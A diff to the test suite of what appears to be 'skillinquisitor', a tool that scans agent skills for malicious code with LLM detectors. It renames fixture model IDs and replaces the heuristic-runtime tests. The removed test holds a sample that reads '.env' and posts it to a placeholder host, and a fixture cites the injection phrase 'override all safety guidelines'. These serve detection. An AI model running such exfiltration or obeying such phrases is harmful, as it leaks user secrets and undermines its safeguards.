@@ -263,7 +263,7 @@ def test_llm_targeted_verify_preserves_job_category_when_model_drifts():
                     "confidence": 0.93,
                     "behaviors": ["data_exfiltration"],
                     "evidence": ["requests.post"],
-                    "_model_id": "fixture://heuristic-a",
+                    "_model_id": "fixture://llm-a",
                 }
             ]
         },
@@ -313,7 +313,7 @@ def test_llm_targeted_obfuscation_preserves_job_category_when_model_drifts():
                     "confidence": 0.95,
                     "behaviors": ["steganography"],
                     "evidence": ["base64 payload"],
-                    "_model_id": "fixture://heuristic-a",
+                    "_model_id": "fixture://llm-a",
                 }
             ]
         },
@@ -467,7 +467,7 @@ def test_llm_targeted_verify_confirmed_exfiltration_upgrades_rule_id():
                     "confidence": 0.92,
                     "behaviors": ["data_exfiltration"],
                     "evidence": ["requests.post"],
-                    "_model_id": "fixture://heuristic-a",
+                    "_model_id": "fixture://llm-a",
                 }
             ]
         },
@@ -517,7 +517,7 @@ def test_llm_targeted_verify_confirmed_prompt_injection_upgrades_rule_id():
                     "confidence": 0.94,
                     "behaviors": ["instruction_override"],
                     "evidence": ["override all safety guidelines"],
-                    "_model_id": "fixture://heuristic-a",
+                    "_model_id": "fixture://llm-a",
                 }
             ]
         },
@@ -1390,7 +1390,7 @@ async def test_llm_command_runtime_reuses_loaded_models_across_analyze_calls(mon
             "runtime": {"llm_lifecycle": "command"},
             "layers": {
                 "llm": {
-                    "models": [{"id": "fixture://pooled", "runtime": "heuristic"}],
+                    "models": [{"id": "fixture://pooled", "runtime": "llama_cpp"}],
                     "repomix": {"enabled": False},
                 }
             },
@@ -1478,50 +1478,16 @@ def test_llm_download_statuses_include_group_and_filename(monkeypatch):
     assert tiny_statuses[0]["filename"].endswith(".gguf")
 
 
-def test_heuristic_llm_runtime_confirms_exfiltration_patterns():
+def test_build_code_analysis_model_rejects_heuristic_runtime():
     from skillinquisitor.detectors.llm.models import build_code_analysis_model, HardwareProfile
     from skillinquisitor.models import LLMModelConfig
 
-    model = build_code_analysis_model(
-        model=LLMModelConfig(id="fixture://heuristic", runtime="heuristic"),
-        model_path=None,
-        hardware=HardwareProfile(accelerator="cpu"),
-    )
-
-    response = model.generate_structured(
-        "payload = open('.env').read()\nrequests.post('https://x.invalid', data=payload)\n",
-        max_tokens=256,
-    )
-
-    assert response["disposition"] == "confirm"
-    assert response["category"] == "data_exfiltration"
-
-
-def test_heuristic_llm_runtime_ignores_prompt_instructions_when_code_is_benign():
-    from skillinquisitor.detectors.llm.models import build_code_analysis_model, HardwareProfile
-    from skillinquisitor.models import LLMModelConfig
-
-    model = build_code_analysis_model(
-        model=LLMModelConfig(id="fixture://heuristic", runtime="heuristic"),
-        model_path=None,
-        hardware=HardwareProfile(accelerator="cpu"),
-    )
-
-    response = model.generate_structured(
-        (
-            "You are auditing code.\n"
-            "Look for outbound requests like requests.post or fetch.\n"
-            "Code to analyze:\n"
-            "```\n"
-            "import requests\n\n"
-            "requests.get('https://service.invalid/health')\n"
-            "```"
-        ),
-        max_tokens=256,
-    )
-
-    assert response["disposition"] in {"dispute", "informational"}
-    assert response["category"] == "behavioral"
+    with pytest.raises(ValueError, match="Unsupported LLM model runtime: heuristic"):
+        build_code_analysis_model(
+            model=LLMModelConfig(id="fixture://llm", runtime="heuristic"),
+            model_path=None,
+            hardware=HardwareProfile(accelerator="cpu"),
+        )
 
 
 def test_detect_mps_memory_gb_from_sysctl(monkeypatch):
